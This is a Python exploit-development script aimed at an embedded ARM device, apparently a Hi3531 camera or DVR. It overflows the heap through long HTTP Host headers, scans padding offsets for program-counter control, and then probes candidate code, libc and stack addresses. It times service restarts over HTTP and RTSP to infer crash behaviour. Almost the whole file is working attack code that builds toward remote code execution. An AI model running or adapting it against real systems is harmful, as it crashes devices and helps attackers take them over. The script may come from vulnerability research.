#!/usr/bin/env python3
"""
http_fp_oracle_v3.py — HTTP heap overflow: systematic PC-offset scan + address oracle.

HTTP heap overflow confirmed at 181 bytes in Host header.
Previous test (336B total) gave ambiguous results:
  - 0xDEADBEEF → NO-RESTART >130s (RTSP stayed up, just HTTP died)
  - 0x00000000 → 37.7s + RTSP DOWN (full reboot somehow)

This version:
  1. Phase A: systematic offset scan (every 4 bytes from 182 to 400)
     → look for which offset makes 0x00000001 cause a FAST restart
     → "FAST" in HTTP context means < 5s if it's a NULL/bad-ptr dereference
     → we also check RTSP throughout to distinguish HTTP-only kill vs full reboot
  2. Phase B: address oracle at confirmed PC-control offset (if found)

Dual liveness:
  - http_alive() → HTTP process alive
  - rtsp_alive() → RTSP process alive (separate process; full reboot = RTSP down too)
"""

import socket, time, struct, sys

TARGET    = "█████████████"
HTTP_PORT = 80
RTSP_PORT = 554

CRASH_THRESHOLD = 181   # confirmed: Host header size that first crashes HTTP

# ─── Liveness probes ──────────────────────────────────────────────────────────

def http_alive(timeout=4):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n\r\n")
        d = s.recv(256)
        s.close()
        return b"HTTP" in d or b"html" in d.lower()
    except:
        return False

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_http(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if http_alive():
            elapsed = time.time() - t0
            if elapsed > 1:
                print(f"  [✓] HTTP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(1)
    print(f"  [✗] HTTP not alive after {max_wait}s ({label})", flush=True)
    return False

def wait_both(max_wait=120, label=""):
    """Wait for BOTH HTTP and RTSP to be alive (full recovery after reboot)."""
    t0 = time.time()
    while time.time() - t0 < max_wait:
        h = http_alive()
        r = rtsp_alive()
        if h and r:
            elapsed = time.time() - t0
            if elapsed > 1:
                print(f"  [✓] Both alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] Not both alive after {max_wait}s ({label})", flush=True)
    return False


def send_host_overflow(host_value, timeout=8):
    req = (b"GET / HTTP/1.1\r\n"
           b"Host: " + host_value + b"\r\n"
           b"User-Agent: curl/7.68.0\r\n"
           b"Connection: close\r\n\r\n")
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, HTTP_PORT))
        s.sendall(req)
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return d
    except:
        return b""


def http_oracle(host_value, label="", poll_timeout=90, check_rtsp=True):
    """
    Send HTTP Host overflow, return:
      (http_restart_time, rtsp_status)
    rtsp_status = 'up' (RTSP never went down), 'down' (RTSP went down during test)
    """
    if not http_alive():
        print(f"  [!] HTTP dead before test ({label}), skipping", flush=True)
        return None, "http_dead"

    # Record initial RTSP state
    rtsp_start = rtsp_alive()

    print(f"  [→] {label} ({len(host_value)}B)", flush=True)
    t0 = time.time()
    send_host_overflow(host_value)

    PROBE = b"GET / HTTP/1.0\r\nHost: " + TARGET.encode() + b"\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    rtsp_went_down = False

    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 10:
            rstat = rtsp_alive()
            if not rstat:
                rtsp_went_down = True
            print(f"    T+{time.time()-t0:.0f}s HTTP_waiting rtsp={'up' if rstat else 'DOWN'}", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, HTTP_PORT))
            s2.sendall(PROBE)
            d2 = b""
            try: d2 = s2.recv(256)
            except: pass
            s2.close()
            if b"HTTP" in d2 or b"html" in d2.lower():
                elapsed = time.time() - t0
                rtsp_final = rtsp_alive()
                if not rtsp_final:
                    rtsp_went_down = True
                tag = "FAST" if elapsed < 5 else ("SOFT-WD" if elapsed < 20 else ("HIT" if elapsed < 70 else "PANIC"))
                rtsp_tag = "RTSP_UP" if not rtsp_went_down else "RTSP_DOWN"
                print(f"  [★] HTTP restart T+{elapsed:.1f}s [{tag}] [{rtsp_tag}]", flush=True)
                return elapsed, ("up" if not rtsp_went_down else "down")
        except:
            pass

    # Final RTSP check
    rtsp_end = rtsp_alive()
    if not rtsp_end:
        rtsp_went_down = True
    print(f"  [?] No HTTP restart in {poll_timeout}s [rtsp={'down' if rtsp_went_down else 'up'}]", flush=True)
    return float(poll_timeout), ("up" if not rtsp_went_down else "down")


def classify(t, rtsp):
    if t is None: return "SKIP"
    t_tag = ("FAST" if t < 5 else "SOFT-WD" if t < 20 else "HIT" if t < 70 else "PANIC" if t < 90 else "DEAD")
    return f"{t_tag}+RTSP_{rtsp.upper()}"


# ─── Phase A: Systematic offset scan ──────────────────────────────────────────

print("=" * 70)
print("Phase A: HTTP Host overflow — systematic PC-offset scan")
print(f"  Crash threshold: {CRASH_THRESHOLD} bytes")
print(f"  Test: Host = pad + 0x00000001 for offsets {CRASH_THRESHOLD}-400")
print(f"  Looking for: FAST restart (= NULL deref from code ptr)")
print("=" * 70)

print("\n[*] Pre-test: checking both services alive...")
wait_both(max_wait=120, label="start")

# Scan offsets where the PC/function-pointer would land
# The heap overflow at 181 bytes: the NEXT free chunk header starts at some multiple of 8
# In dlmalloc/ptmalloc: chunks are 8-byte aligned, min size 16 bytes
# After overflow, the value at offset X (from start of host) lands on some structure

RESULTS = []
BAD_PC = struct.pack('<I', 0x00000001)   # almost-NULL, guaranteed bad code addr
NULL_PC = struct.pack('<I', 0x00000000)  # strict NULL

for pad_total in range(CRASH_THRESHOLD + 1, 420, 4):
    # host = padding + BAD_PC + trailing
    host = b"\xcc" * pad_total + BAD_PC + b"\xdd" * 16
    label = f"offset={pad_total} BAD_PC=0x00000001"
    t, rtsp = http_oracle(host, label=label, poll_timeout=90)
    cls = classify(t, rtsp)
    RESULTS.append((pad_total, t, rtsp, cls))
    print(f"  offset={pad_total:4d}  t={t:.1f}s  {cls}", flush=True)

    # If FAST + RTSP_UP: this looks like a CODE pointer overwrite!
    if t is not None and t < 5 and rtsp == "up":
        print(f"  *** CANDIDATE PC-CONTROL OFFSET: {pad_total} ***", flush=True)
        print(f"  *** BAD_PC → fast SIGSEGV, RTSP unaffected = code ptr ***", flush=True)

    # Recovery
    time.sleep(3)
    wait_both(max_wait=120, label=f"after {pad_total}")

print()
print("=" * 70)
print("Phase A Summary:")
print("=" * 70)
for pad_total, t, rtsp, cls in RESULTS:
    if t is not None and t < 20:
        print(f"  offset={pad_total:4d}  t={t:.1f}s  {cls}  ← interesting")
    else:
        print(f"  offset={pad_total:4d}  t={t:.1f}s  {cls}")

# Find best PC-control candidate
candidates = [(off, t, rtsp) for off, t, rtsp, cls in RESULTS
              if t is not None and t < 5 and rtsp == "up"]

if not candidates:
    print("\n  [!] No clean PC-control offset found in scan range")
    print("  Possible causes:")
    print("   1. PC control offset > 420")
    print("   2. Heap overflow only overwrites data (not code) pointers")
    print("   3. ASLR/NX prevents clean crash from code ptr with val=1")
    BEST_OFFSET = 332   # use previous best guess
else:
    BEST_OFFSET = candidates[0][0]
    print(f"\n  Best PC-control offset: {BEST_OFFSET}")


# ─── Phase B: Address oracle at confirmed offset ──────────────────────────────

print()
print("=" * 70)
print(f"Phase B: Address oracle at offset={BEST_OFFSET}")
print(f"  Testing 20 addresses covering ELF text + mmap + stack")
print("=" * 70)

# Focus on the most likely regions for a 2012 ARM embedded binary
SCAN_ADDRS = [
    # Low text addresses (ARM ELF default load: 0x8000-0x10000)
    (0x00008000, "ELF_base"),
    (0x00008100, "ELF_text+0x100"),
    (0x00009000, "ELF_text+0x1000"),
    (0x0000a000, "ELF_text+0x2000"),
    (0x0000c000, "ELF_text+0x4000"),
    (0x00010000, "ELF_text+0x8000"),
    (0x00020000, "ELF_text+0x18000"),
    (0x00040000, "ELF_text+0x38000"),
    # Typical libc.so mmap base on old ARM Linux (no ASLR): 0x40000000
    (0x40000000, "libc_mmap_base"),
    (0x40010000, "libc+0x10000"),
    (0x40020000, "libc+0x20000"),
    (0x40040000, "libc+0x40000"),
    (0x40080000, "libc+0x80000"),
    # Stack range (ASLR disabled stack would be near 0xBFFF8000)
    (0xBFFF8000, "stack_top"),
    (0xBFFF0000, "stack-0x8000"),
    (0xBFFE0000, "stack-0x18000"),
    # Hi3531 memory-mapped I/O (GPIO, timers) — might map into process?
    (0x10000000, "mmio_test_1"),
    (0x20000000, "mmio_test_2"),
    # VDSO / shared libraries on ARM (common base: 0xb6f00000+ range)
    (0xb6f00000, "libc_aslr_typical_1"),
    (0xb7000000, "libc_aslr_typical_2"),
]

wait_both(max_wait=120, label="before Phase B")

for addr, label in SCAN_ADDRS:
    host = b"\xcc" * BEST_OFFSET + struct.pack('<I', addr) + b"\xdd" * 16
    full_label = f"PhB addr=0x{addr:08X} ({label})"
    t, rtsp = http_oracle(host, label=full_label, poll_timeout=90)
    cls = classify(t, rtsp)
    print(f"  0x{addr:08X}  {label:25s}  {t:.1f}s  {cls}", flush=True)
    time.sleep(5)
    wait_both(max_wait=120, label=f"after {label}")

print("\nDone.")
